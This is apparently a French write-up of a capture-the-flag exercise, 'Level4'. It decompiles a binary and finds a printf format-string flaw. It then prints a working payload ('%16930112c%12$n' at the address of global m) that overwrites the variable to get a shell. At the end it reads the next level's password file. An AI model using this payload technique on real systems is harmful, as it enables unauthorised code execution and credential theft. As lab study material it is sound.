
# Level4

---
###### Étape 1 : -- Décompiler le programme --

En décompilant le programme avec Dogbolt ou Ghidra, on voit dans le programme trois fonctions V, P et Main ainsi qu'une variable globale m.

On voit par la suite que dans la fonction P il y a la fonction __printf__ qui est appelé.

 - on utilisera cette fonction pour overflow le programme.

On voit aussi que dans la fonction V on a la fonction __fgets__ qui est un fonction proteger, qui viens récupérer 512 charactères dans l'entrée standard.

Plus loin dans le progamme m est check pour savoir si elle contient la valeur 16930116.

Si c'est le cas alors le programme lance un terminal bash.

Vu que fgets recupèreque 512 charactères il nous faut trouver une solution pour ecrire les 16930116 charactères.

###### Étape 2: -- Récuperation d'information --

Depuis __GDB__, on cherche l'addresse de m qui ce trouve etre ==0x08049810==.

En lancant le programe comme suit:
```bash
python -c 'print "AAAA" + " %p " * 20' | ./level4
```

on observe ce resultat: 
> AAAA 0xb7ff26b0  0xbffff784  0xb7fd0ff4  (nil)  (nil)  0xbffff748  0x804848d  0xbffff540  0x200  0xb7fd1ac0  0xb7ff37d0  0x41414141 [...] 

on voit que la chaine "_AAAA_" -> hex: "_0x41414141_" ce situe a la 12ème position.
c'est donc a cette position que l'on vas ecrire payload pour remplir m.

###### Étape 3: -- Execution --

Avec la postion d'écriture du ___printf___ et l'addresse de ___m___, on crée un one-liner python pour executer un payload pour mettre la valeur 16930116 dans la variable ___m___.

pour écrire le 16930116 de char on utilise les fonctionnaliter des flags de ___printf___ comme par exemple le faite d'écrire des espaces avant une string ou un char.

Contruction du payload: 
> (python - c 'print "[m(address)]" + "%[16930116 - sizeof(m)]c" + "%12$n"'; cat -) | ./binary

Payload final :

```bash
python -c 'print "\x10\x98\x04\x08" + "%16930112c" "%12$n"' | ./level4
```

Dans le terminal on execute la commande suivante pour récupérer le password du level5:

```bash
cat /home/user/level5/.pass
```




